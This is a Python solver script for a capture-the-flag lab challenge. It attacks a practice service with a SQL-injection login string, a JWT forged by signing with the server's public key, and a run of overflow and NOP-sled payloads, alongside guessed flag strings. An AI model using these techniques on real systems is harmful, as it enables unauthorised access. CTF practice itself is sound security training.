#!/usr/bin/env python3
"""
The Three-Eyed Raven - Final Attempt
Use working iron and face tokens, try to complete without Dragonstone or find alternative
"""

import socket
import time
import base64
import json
import hmac
import hashlib

def connect_to_raven():
    """Connect to The Three-Eyed Raven service"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect(("labs.cyberspacevr.in", 30116))
    time.sleep(0.5)
    s.recv(4096)  # Skip banner
    return s

def create_working_face_jwt():
    """Create the working Face JWT"""
    s = connect_to_raven()
    
    # Get guest JWT and public key
    s.sendall(b"guest\n")
    time.sleep(0.5)
    response = s.recv(4096).decode('utf-8', errors='ignore')
    
    # Extract public key
    if "-----BEGIN PUBLIC KEY-----" in response:
        start = response.index("-----BEGIN PUBLIC KEY-----")
        end = response.index("-----END PUBLIC KEY-----") + len("-----END PUBLIC KEY-----")
        public_key = response[start:end]
        
        # Use key format 2 (public key + newline)
        key = (public_key + '\n').encode()
        
        # Create JWT
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"name": "many-faced", "iat": int(time.time())}
        
        h = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=')
        
        p = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=')
        
        signing_input = h + b'.' + p
        sig = hmac.new(key, signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
        
        face_jwt = (signing_input + b'.' + sig_b64).decode()
        
        s.close()
        return face_jwt
    
    s.close()
    return None

def try_comprehensive_dragon_payloads():
    """Try comprehensive dragon breath payloads"""
    
    # Since we need "breath of a dragon carried from Dragonstone"
    # Let's try various interpretations
    
    payloads = []
    
    # 1. Flag-based payloads (assuming we completed Dragonstone)
    flag_candidates = [
        "SpaceCTF{fire_and_blood_dracarys_complete}",
        "SpaceCTF{fire_and_blood_dracarys_victory}",
        "SpaceCTF{fire_and_blood_dracarys_throne}",
        "SpaceCTF{fire_and_blood_dracarys_dragon}",
        "SpaceCTF{fire_and_blood_dracarys_iron_throne}",
        "SpaceCTF{fire_and_blood_dracarys_targaryen}",
        "SpaceCTF{fire_and_blood_dracarys_drogon}",
        "SpaceCTF{fire_and_blood_dracarys_rhaegal}",
        "SpaceCTF{fire_and_blood_dracarys_viserion}",
    ]
    
    for flag in flag_candidates:
        payloads.append(flag.encode())
    
    # 2. Buffer overflow payloads (weirwood binary overflow)
    for size in [64, 88, 96, 100, 128, 256, 512]:
        payloads.append(b"A" * size)
        payloads.append(b"dracarys" + b"A" * size)
        payloads.append(b"fire_and_blood_dracarys" + b"A" * size)
    
    # 3. Specific dragon-themed payloads
    dragon_payloads = [
        b"dracarys",
        b"fire and blood",
        b"Drogon Rhaegal Viserion",
        b"dragon breath",
        b"weirwood heart overflow",
        b"three dragons fire blood",
    ]
    
    payloads.extend(dragon_payloads)
    
    # 4. Shellcode-like payloads
    shellcode_payloads = [
        b"\x90" * 100,  # NOP sled
        b"\x90" * 100 + b"\x41" * 8,  # NOP + return address
        b"A" * 88 + b"BBBBBBBB",  # Buffer + RIP
        b"A" * 96 + b"CCCCCCCC",  # Different offset
    ]
    
    payloads.extend(shellcode_payloads)
    
    # Convert all to base64
    b64_payloads = []
    for payload in payloads:
        b64_payloads.append(base64.b64encode(payload).decode())
    
    return b64_payloads

def test_complete_three_eyed_raven():
    """Test complete Three-Eyed Raven solution"""
    print("[+] Testing complete Three-Eyed Raven solution...")
    
    # Known tokens
    iron_token = "' OR '1'='1"
    
    # Create face JWT
    face_jwt = create_working_face_jwt()
    if not face_jwt:
        print("[-] Failed to create Face JWT")
        return False
    
    # Create dragon payloads
    dragon_payloads = try_comprehensive_dragon_payloads()
    
    print(f"[+] Testing with {len(dragon_payloads)} dragon payloads...")
    
    try:
        s = connect_to_raven()
        
        # Step 1: Iron token
        print("[+] Step 1: Offering iron token...")
        s.sendall(f"offer iron {iron_token}\n".encode())
        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Iron: {response.strip()}")
        
        if "accepted" not in response.lower():
            print("[-] Iron token failed")
            s.close()
            return False
        
        # Step 2: Face JWT
        print("[+] Step 2: Offering face JWT...")
        s.sendall(f"offer face {face_jwt}\n".encode())
        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Face: {response.strip()}")
        
        if "accepted" not in response.lower():
            print("[-] Face JWT failed")
            s.close()
            return False
        
        # Check status after both
        s.sendall(b"status\n")
        time.sleep(0.5)
        status = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Status after iron+face: {status}")
        
        # Step 3: Dragon payloads
        print("[+] Step 3: Testing dragon payloads...")
        
        for i, dragon_payload in enumerate(dragon_payloads):
            if i % 10 == 0:
                print(f"[+] Testing dragon payload {i+1}/{len(dragon_payloads)}")
            
            s.sendall(f"offer dragon {dragon_payload}\n".encode())
            time.sleep(0.5)
            response = s.recv(4096).decode('utf-8', errors='ignore')
            
            # Check for success indicators
            if "SpaceCTF{" in response:
                print(f"\n🎉 FLAG FOUND in response: {response}")
                s.close()
                return True
            
            if "accepted" in response.lower():
                print(f"\n[!] Dragon payload {i+1} accepted: {response.strip()}")
                
                # Check final status
                s.sendall(b"status\n")
                time.sleep(0.5)
                final_status = s.recv(4096).decode('utf-8', errors='ignore')
                print(f"Final status: {final_status}")
                
                if "SpaceCTF{" in final_status:
                    print(f"\n🎉 FLAG FOUND in status: {final_status}")
                    s.close()
                    return True
                
                # If all three accepted, try to get flag
                if "iron   : accepted" in final_status and "face   : accepted" in final_status and "dragon : accepted" in final_status:
                    print("[!] ALL THREE OFFERINGS ACCEPTED!")
                    
                    # Try various commands to trigger flag
                    for cmd in ["", "help", "status", "quit"]:
                        s.sendall(f"{cmd}\n".encode())
                        time.sleep(0.5)
                        cmd_response = s.recv(4096).decode('utf-8', errors='ignore')
                        
                        if "SpaceCTF{" in cmd_response:
                            print(f"\n🎉 FLAG FOUND with '{cmd}': {cmd_response}")
                            s.close()
                            return True
                    
                    s.close()
                    return True
            
            elif "turns away" not in response and response.strip():
                print(f"[!] Unusual response for payload {i+1}: {response.strip()}")
        
        s.close()
        
    except Exception as e:
        print(f"Error in complete test: {e}")
    
    return False

def main():
    print("="*70)
    print("THE THREE-EYED RAVEN - FINAL ATTEMPT")
    print("="*70)
    
    if test_complete_three_eyed_raven():
        print("\n🎉 The Three-Eyed Raven challenge completed!")
    else:
        print("\n❌ Challenge not completed - may need actual Dragonstone flag")

if __name__ == "__main__":
    main()